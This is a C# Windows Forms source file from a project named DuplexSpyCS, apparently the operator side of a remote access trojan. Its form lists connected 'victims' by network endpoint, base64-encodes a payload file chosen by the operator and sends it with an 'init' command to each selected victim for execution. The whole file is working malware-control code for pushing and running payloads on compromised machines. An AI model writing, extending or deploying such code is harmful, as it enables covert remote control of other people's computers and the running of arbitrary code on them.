using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmImplantInvoke : Form
    {
        private List<Victim> m_lVictim;

        public frmImplantInvoke(List<Victim> lVictim)
        {
            InitializeComponent();

            m_lVictim = lVictim;
        }

        /// <summary>
        /// Send payload.
        /// </summary>
        /// <param name="lVictim">List of victim.</param>
        /// <param name="szFileName">Payload file.</param>
        /// <param name="aszParams">Paramaters</param>
        private void fnSendPayload(List<Victim> lVictim, string szFileName, string[] aszParams)
        {
            try
            {
                byte[] abFileBytes = File.ReadAllBytes(szFileName);
                string szB64Payload = Convert.ToBase64String(abFileBytes);
                string szParams = clsEZData.fnListStrToStr(aszParams.ToList());


                foreach (Victim v in lVictim)
                {
                    v.SendCommand($"init|{szParams}|{szB64Payload}");
                }
            }
            catch (Exception ex)
            {

            }
        }

        private void fnSetup()
        {
            foreach (Victim v in m_lVictim)
            {
                ListViewItem item = new ListViewItem(v.socket.RemoteEndPoint.ToString());
                item.SubItems.Add("?");
                item.Tag = v;

                listView1.Items.Add(item);
            }
        }

        private void frmImplantInvoke_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                textBox1.Text = ofd.FileName;
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            List<Victim> lVictim = listView1.CheckedItems.Cast<ListViewItem>().Select(x => (Victim)x.Tag).ToList();
            if (lVictim.Count == 0)
                return;

            string szFileName = textBox1.Text;
            if (!File.Exists(szFileName))
            {
                MessageBox.Show("File not found: " + szFileName, "FileNotFound", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            string[] aszParams = textBox2.Text.Split(' ');
            Task.Run(() => fnSendPayload(lVictim, szFileName, aszParams));
        }
    }
}
